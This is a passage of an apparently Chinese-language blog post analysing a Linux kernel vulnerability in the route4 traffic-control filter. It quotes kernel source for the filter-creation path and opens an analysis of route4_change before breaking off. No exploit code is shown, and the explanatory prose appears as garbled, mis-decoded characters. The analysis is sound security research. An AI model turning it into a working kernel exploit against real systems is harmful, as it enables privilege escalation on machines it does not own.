QDISC_CLASS_OPS_DOIT_UNLOCKED)) ||</span><br><span class="line">    !tcf_proto_is_unlocked(name)) &#123;</span><br><span class="line">rtnl_held = <span class="literal">true</span>;</span><br><span class="line">rtnl_lock();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = __tcf_qdisc_cl_find(q, parent, &amp;cl, t-&gt;tcm_ifindex, extack);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line"></span><br><span class="line">block = __tcf_block_find(net, q, cl, t-&gt;tcm_ifindex, t-&gt;tcm_block_index,</span><br><span class="line"> extack);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(block)) &#123;</span><br><span class="line">err = PTR_ERR(block);</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line">block-&gt;classid = parent;</span><br><span class="line"></span><br><span class="line">chain_index = tca[TCA_CHAIN] ? nla_get_u32(tca[TCA_CHAIN]) : <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (chain_index &gt; TC_ACT_EXT_VAL_MASK) &#123;</span><br><span class="line">NL_SET_ERR_MSG(extack, <span class="string">&quot;Specified chain index exceeds upper limit&quot;</span>);</span><br><span class="line">err = -EINVAL;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line">chain = tcf_chain_get(block, chain_index, <span class="literal">true</span>);</span><br><span class="line"><span class="keyword">if</span> (!chain) &#123;</span><br><span class="line">NL_SET_ERR_MSG(extack, <span class="string">&quot;Cannot create specified filter chain&quot;</span>);</span><br><span class="line">err = -ENOMEM;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mutex_lock(&amp;chain-&gt;filter_chain_lock);</span><br><span class="line">tp = tcf_chain_tp_find(chain, &amp;chain_info, protocol,</span><br><span class="line">       prio, prio_allocate);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(tp)) &#123;</span><br><span class="line">NL_SET_ERR_MSG(extack, <span class="string">&quot;Filter with specified priority/protocol not found&quot;</span>);</span><br><span class="line">err = PTR_ERR(tp);</span><br><span class="line"><span class="keyword">goto</span> errout_locked;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tp == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tcf_proto</span> *<span class="title">tp_new</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (chain-&gt;flushing) &#123;</span><br><span class="line">err = -EAGAIN;</span><br><span class="line"><span class="keyword">goto</span> errout_locked;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Proto-tcf does not exist, create new one */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tca[TCA_KIND] == <span class="literal">NULL</span> || !protocol) &#123;</span><br><span class="line">NL_SET_ERR_MSG(extack, <span class="string">&quot;Filter kind and protocol must be specified&quot;</span>);</span><br><span class="line">err = -EINVAL;</span><br><span class="line"><span class="keyword">goto</span> errout_locked;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(n-&gt;nlmsg_flags &amp; NLM_F_CREATE)) &#123;</span><br><span class="line">NL_SET_ERR_MSG(extack, <span class="string">&quot;Need both RTM_NEWTFILTER and NLM_F_CREATE to create a new filter&quot;</span>);</span><br><span class="line">err = -ENOENT;</span><br><span class="line"><span class="keyword">goto</span> errout_locked;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (prio_allocate)</span><br><span class="line">prio = tcf_auto_prio(tcf_chain_tp_prev(chain,</span><br><span class="line">       &amp;chain_info));</span><br><span class="line"></span><br><span class="line">mutex_unlock(&amp;chain-&gt;filter_chain_lock);</span><br><span class="line">tp_new = tcf_proto_create(name, protocol, prio, chain,</span><br><span class="line">  rtnl_held, extack);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(tp_new)) &#123;</span><br><span class="line">err = PTR_ERR(tp_new);</span><br><span class="line"><span class="keyword">goto</span> errout_tp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tp_created = <span class="number">1</span>;</span><br><span class="line">tp = tcf_chain_tp_insert_unique(chain, tp_new, protocol, prio,</span><br><span class="line">rtnl_held);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(tp)) &#123;</span><br><span class="line">err = PTR_ERR(tp);</span><br><span class="line"><span class="keyword">goto</span> errout_tp;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">mutex_unlock(&amp;chain-&gt;filter_chain_lock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tca[TCA_KIND] &amp;&amp; nla_strcmp(tca[TCA_KIND], tp-&gt;ops-&gt;kind)) &#123;</span><br><span class="line">NL_SET_ERR_MSG(extack, <span class="string">&quot;Specified filter kind does not match existing one&quot;</span>);</span><br><span class="line">err = -EINVAL;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fh = tp-&gt;ops-&gt;get(tp, t-&gt;tcm_handle);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!fh) &#123;</span><br><span class="line"><span class="keyword">if</span> (!(n-&gt;nlmsg_flags &amp; NLM_F_CREATE)) &#123;</span><br><span class="line">NL_SET_ERR_MSG(extack, <span class="string">&quot;Need both RTM_NEWTFILTER and NLM_F_CREATE to create a new filter&quot;</span>);</span><br><span class="line">err = -ENOENT;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (n-&gt;nlmsg_flags &amp; NLM_F_EXCL) &#123;</span><br><span class="line">tfilter_put(tp, fh);</span><br><span class="line">NL_SET_ERR_MSG(extack, <span class="string">&quot;Filter already exists&quot;</span>);</span><br><span class="line">err = -EEXIST;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (chain-&gt;tmplt_ops &amp;&amp; chain-&gt;tmplt_ops != tp-&gt;ops) &#123;</span><br><span class="line">NL_SET_ERR_MSG(extack, <span class="string">&quot;Chain template is set to a different filter kind&quot;</span>);</span><br><span class="line">err = -EINVAL;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(n-&gt;nlmsg_flags &amp; NLM_F_CREATE))</span><br><span class="line">flags |= TCA_ACT_FLAGS_REPLACE;</span><br><span class="line"><span class="keyword">if</span> (!rtnl_held)</span><br><span class="line">flags |= TCA_ACT_FLAGS_NO_RTNL;</span><br><span class="line">err = tp-&gt;ops-&gt;change(net, skb, tp, cl, t-&gt;tcm_handle, tca, &amp;fh,</span><br><span class="line">      flags, extack);</span><br><span class="line"><span class="keyword">if</span> (err == <span class="number">0</span>) &#123;</span><br><span class="line">tfilter_notify(net, skb, n, tp, block, q, parent, fh,</span><br><span class="line">       RTM_NEWTFILTER, <span class="literal">false</span>, rtnl_held);</span><br><span class="line">tfilter_put(tp, fh);</span><br><span class="line"><span class="comment">/* q pointer is NULL for shared blocks */</span></span><br><span class="line"><span class="keyword">if</span> (q)</span><br><span class="line">q-&gt;flags &amp;= ~TCQ_F_CAN_BYPASS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">errout:</span><br><span class="line"><span class="keyword">if</span> (err &amp;&amp; tp_created)</span><br><span class="line">tcf_chain_tp_delete_empty(chain, tp, rtnl_held, <span class="literal">NULL</span>);</span><br><span class="line">errout_tp:</span><br><span class="line"><span class="keyword">if</span> (chain) &#123;</span><br><span class="line"><span class="keyword">if</span> (tp &amp;&amp; !IS_ERR(tp))</span><br><span class="line">tcf_proto_put(tp, rtnl_held, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (!tp_created)</span><br><span class="line">tcf_chain_put(chain);</span><br><span class="line">&#125;</span><br><span class="line">tcf_block_release(q, block, rtnl_held);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (rtnl_held)</span><br><span class="line">rtnl_unlock();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (err == -EAGAIN) &#123;</span><br><span class="line"><span class="comment">/* Take rtnl lock in case EAGAIN is caused by concurrent flush</span></span><br><span class="line"><span class="comment"> * of target chain.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">rtnl_held = <span class="literal">true</span>;</span><br><span class="line"><span class="comment">/* Replay the request. */</span></span><br><span class="line"><span class="keyword">goto</span> replay;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">errout_locked:</span><br><span class="line">mutex_unlock(&amp;chain-&gt;filter_chain_lock);</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç®€å•è¯´ä¸€ä¸‹ä¸Šé¢å‡½æ•°çš„é€»è¾‘ï¼Œé¦–å…ˆé€šè¿‡<code>tcf_proto_check_kind(tca[TCA_KIND], name)</code>è·å–è¿‡æ»¤å™¨çš„åå­—ï¼Œéšåé€šè¿‡<code>tp = tcf_chain_tp_find(chain, &amp;chain_info, protocol, prio, prio_allocate)</code>è·å–æŒ‡å®šåè®®çš„è¿‡æ»¤å™¨tpï¼Œå¦‚æœtpä¸ºnullåˆ™ä¼šåˆ›å»ºæ–°çš„tpï¼Œè¿™é‡Œé€šè¿‡<code>tp_new = tcf_proto_create(name, protocol, prio, chain, rtnl_held, extack);</code>å‡½æ•°è¿›è¡Œåˆ›å»º</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct tcf_proto *<span class="title">tcf_proto_create</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *kind, u32 protocol,</span></span></span><br><span class="line"><span class="params"><span class="function">  u32 prio, struct tcf_chain *chain,</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="keyword">bool</span> rtnl_held,</span></span></span><br><span class="line"><span class="params"><span class="function">  struct netlink_ext_ack *extack)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tcf_proto</span> *<span class="title">tp</span>;</span></span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">tp = kzalloc(<span class="keyword">sizeof</span>(*tp), GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!tp)</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-ENOBUFS);</span><br><span class="line"></span><br><span class="line">tp-&gt;ops = tcf_proto_lookup_ops(kind, rtnl_held, extack);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(tp-&gt;ops)) &#123;</span><br><span class="line">err = PTR_ERR(tp-&gt;ops);</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line">tp-&gt;classify = tp-&gt;ops-&gt;classify;</span><br><span class="line">tp-&gt;protocol = protocol;</span><br><span class="line">tp-&gt;prio = prio;</span><br><span class="line">tp-&gt;chain = chain;</span><br><span class="line">spin_lock_init(&amp;tp-&gt;lock);</span><br><span class="line">refcount_set(&amp;tp-&gt;refcnt, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">err = tp-&gt;ops-&gt;init(tp);</span><br><span class="line"><span class="keyword">if</span> (err) &#123;</span><br><span class="line">module_put(tp-&gt;ops-&gt;owner);</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> tp;</span><br><span class="line"></span><br><span class="line">errout:</span><br><span class="line">kfree(tp);</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(err);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆæ˜¯ä¸ºtpåˆ†é…äº†ä¸€ä¸ª<code>object</code>éšåé€šè¿‡<code>tcf_proto_lookup_ops</code>å‡½æ•°æ ¹æ®<code>kind</code>è·å–åˆ°å¯¹åº”çš„ops</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcf_proto_ops</span> *__<span class="title">tcf_proto_lookup_ops</span>(<span class="title">const</span> <span class="title">char</span> *<span class="title">kind</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcf_proto_ops</span> *<span class="title">t</span>, *<span class="title">res</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (kind) &#123;</span><br><span class="line">read_lock(&amp;cls_mod_lock);</span><br><span class="line">list_for_each_entry(t, &amp;tcf_proto_base, head) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(kind, t-&gt;kind) == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (try_module_get(t-&gt;owner))</span><br><span class="line">res = t;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">read_unlock(&amp;cls_mod_lock);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä»¥routeä¸ºä¾‹å­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcf_proto_ops</span> <span class="title">cls_route4_ops</span> __<span class="title">read_mostly</span> =</span> &#123;</span><br><span class="line">.kind=<span class="string">&quot;route&quot;</span>,</span><br><span class="line">.classify=route4_classify,</span><br><span class="line">.init=route4_init,</span><br><span class="line">.destroy=route4_destroy,</span><br><span class="line">.get=route4_get,</span><br><span class="line">.change=route4_change,</span><br><span class="line">.<span class="keyword">delete</span>=route4_delete,</span><br><span class="line">.walk=route4_walk,</span><br><span class="line">.dump=route4_dump,</span><br><span class="line">.bind_class=route4_bind_class,</span><br><span class="line">.owner=THIS_MODULE,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„opså°†ä¼šè·å¾—å¦‚ä¸Š<code>cls_route4_ops</code>ç»“æ„ä½“éšåä¼šè°ƒç”¨<code>tp-&gt;ops-&gt;init(tp)</code>è¿›è¡Œåˆå§‹åŒ–</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">route4_init</span><span class="params">(struct tcf_proto *tp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">route4_head</span> *<span class="title">head</span>;</span></span><br><span class="line"></span><br><span class="line">head = kzalloc(<span class="keyword">sizeof</span>(struct route4_head), GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (head == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> -ENOBUFS;</span><br><span class="line"></span><br><span class="line">rcu_assign_pointer(tp-&gt;root, head);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¯¥å‡½æ•°ä¼šç”Ÿæˆä¸€ä¸ª<code>route4_head</code>ç»“æ„ä½“ï¼Œæ­¤ç»“æ„ä½“çš„ä½œç”¨æ˜¯ç”¨äºå­˜æ”¾è¿‡æ»¤å™¨å¯¹åº”çš„å“ˆå¸Œå€¼ã€‚</p><p>æ¥ç€å›åˆ°<code>tc_new_tfilter</code>å‡½æ•°ï¼Œå…¶ä¼šå°†æ–°ç”Ÿæˆçš„tpåŠ å…¥åˆ°chainä¸­ã€‚æ¥ä¸‹æ¥å°±ä¼šé€šè¿‡<code>fh = tp-&gt;ops-&gt;get(tp, t-&gt;tcm_handle)</code>è¯­å¥è°ƒç”¨å¯¹åº”çš„getå‡½æ•°ï¼Œæ ¹æ®<code>tcm_handle</code>è·å–åˆ°è¿‡æ»¤å™¨</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">route4_get</span><span class="params">(struct tcf_proto *tp, u32 handle)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">route4_head</span> *<span class="title">head</span> =</span> rtnl_dereference(tp-&gt;root);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">route4_bucket</span> *<span class="title">b</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">route4_filter</span> *<span class="title">f</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> h1, h2;</span><br><span class="line"></span><br><span class="line">h1 = to_hash(handle);</span><br><span class="line"><span class="keyword">if</span> (h1 &gt; <span class="number">256</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">h2 = from_hash(handle &gt;&gt; <span class="number">16</span>);</span><br><span class="line"><span class="keyword">if</span> (h2 &gt; <span class="number">32</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">b = rtnl_dereference(head-&gt;table[h1]);</span><br><span class="line"><span class="keyword">if</span> (b) &#123;</span><br><span class="line"><span class="keyword">for</span> (f = rtnl_dereference(b-&gt;ht[h2]);</span><br><span class="line">     f;</span><br><span class="line">     f = rtnl_dereference(f-&gt;next))</span><br><span class="line"><span class="keyword">if</span> (f-&gt;handle == handle)</span><br><span class="line"><span class="keyword">return</span> f;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¼šæ ¹æ®<code>handle</code>ä»<code>route4_head</code>é“¾è¡¨ä¸­è·å–å¯¹åº”çš„<code>route4_filter</code>ã€‚å¦‚æœè¿”å›ä¸ºç©ºï¼Œä¼šæ¥ç€è¿›å…¥åˆ°<code>tc_new_tfilter</code>å‡½æ•°çš„åç»­æµç¨‹ï¼Œæœ€ç»ˆåœ¨<code>tp-&gt;ops-&gt;change(net, skb, tp, cl, t-&gt;tcm_handle, tca, &amp;fh, flags, extack)</code>è¯­å¥è°ƒç”¨<code>change</code>å‡½æ•°åˆ›å»ºä¸€ä¸ªæ–°çš„è¿‡æ»¤å™¨ã€‚</p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>æ¼æ´å‡ºç°åœ¨<code>route4_change</code>å‡½æ•°ä¸­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">route4_change</span><span class="params">(struct net *net, struct sk_buff *in_skb,</span></span></span><br><span class="line"><span class="params"><span class="function"> struct tcf_proto *tp, <span class="keyword">unsigned</span> <span class="keyword">long</span> base, u32 handle,</span></span></span><br><span class="line"><span class="params"><span class="function"> struct nlattr **tca, <span class="keyword">void</span> **arg, u32 flags,</span></span></span><br><span class="line"><span class="params"><span class="function"> struct netlink_ext_ack *extack)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">route4_head</span> *<span class="title">head</span> =</span> rtnl_dereference(tp-&gt;root);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">route4_filter</span> __<span class="title">rcu</span> **<span class="title">fp</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">route4_filter</span> *<span class="title">fold</span>, *<span class="title">f1</span>, *<span class="title">pfp</span>, *<span class="title">f</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">route4_bucket</span> *<span class="title">b</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">opt</span> =</span> tca[TCA_OPTIONS];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">tb</span>[<span class="title">TCA_ROUTE4_MAX</span> + 1];</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> h, th;</span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">new</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (opt == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> handle ? -EINVAL : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">err = nla_parse_nested_deprecated(tb, TCA_ROUTE4_MAX, opt,</span><br><span class="line">  route4_policy, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">fold = *arg;</span><br><span class="line"><span class="keyword">if</span> (fold &amp;&amp; handle &amp;&amp; fold-&gt;handle != handle)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">err = -ENOBUFS;</span><br><span class="line">f = kzalloc(<span class="keyword">sizeof</span>(struct route4_filter), GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!f)</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line"></span><br><span class="line">err = tcf_exts_init(&amp;f-&gt;exts, net, TCA_ROUTE4_ACT, TCA_ROUTE4_POLICE);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fold) &#123;</span><br><span class="line">f-&gt;id = fold-&gt;id;</span><br><span class="line">f-&gt;iif = fold-&gt;iif;</span><br><span class="line">f-&gt;res = fold-&gt;res;</span><br><span class="line">f-&gt;handle = fold-&gt;handle;</span><br><span class="line"></span><br><span class="line">f-&gt;tp = fold-&gt;tp;</span><br><span class="line">f-&gt;bkt = fold-&gt;bkt;</span><br><span class="line"><span class="keyword">new</span> = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = route4_set_parms(net, tp, base, f, handle, head, tb,</span><br><span class="line">       tca[TCA_RATE], <span class="keyword">new</span>, flags, extack);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line"></span><br><span class="line">h = from_hash(f-&gt;handle &gt;&gt; <span class="number">16</span>);</span><br><span class="line">fp = &amp;f-&gt;bkt-&gt;ht[h];</span><br><span class="line"><span class="keyword">for</span> (pfp = rtnl_dereference(*fp);</span><br><span class="line">     (f1 = rtnl_dereference(*fp)) != <span class="literal">NULL</span>;</span><br><span class="line">     fp = &amp;f1-&gt;next)</span><br><span class="line"><span class="keyword">if</span> (f-&gt;handle &lt; f1-&gt;handle)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">tcf_block_netif_keep_dst(tp-&gt;chain-&gt;block);</span><br><span class="line">rcu_assign_pointer(f-&gt;next, f1);</span><br><span class="line">rcu_assign_pointer(*fp, f);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fold &amp;&amp; fold-&gt;handle &amp;&amp; f-&gt;handle != fold-&gt;handle) &#123;</span><br><span class="line">th = to_hash(fold-&gt;handle);</span><br><span class="line">h = from_hash(fold-&gt;handle &gt;&gt; <span class="number">16</span>);</span><br><span class="line">b = rtnl_dereference(head-&gt;table[th]);</span><br><span class="line"><span class="keyword">if</span> (b) &#123;</span><br><span class="line">fp = &amp;b-&gt;ht[h];</span><br><span class="line"><span class="keyword">for</span> (pfp = rtnl_dereference(*fp); pfp;</span><br><span class="line">     fp = &amp;pfp-&gt;next, pfp = rtnl_dereference(*fp)) &#123;</span><br><span class="line"><span class="keyword">if</span> (pfp == fold) &#123;</span><br><span class="line">rcu_assign_pointer(*fp, fold-&gt;next);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">route4_reset_fastmap(head);</span><br><span class="line">*arg = f;</span><br><span class="line"><span class="keyword">if</span> (fold) &#123;</span><br><span class="line">tcf_unbind_filter(tp, &amp;fold-&gt;res);</span><br><span class="line">tcf_exts_get_net(&amp;fold-&gt;exts);</span><br><span class="line">tcf_queue_work(&amp;fold-&gt;rwork, route4_delete_filter_work);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span 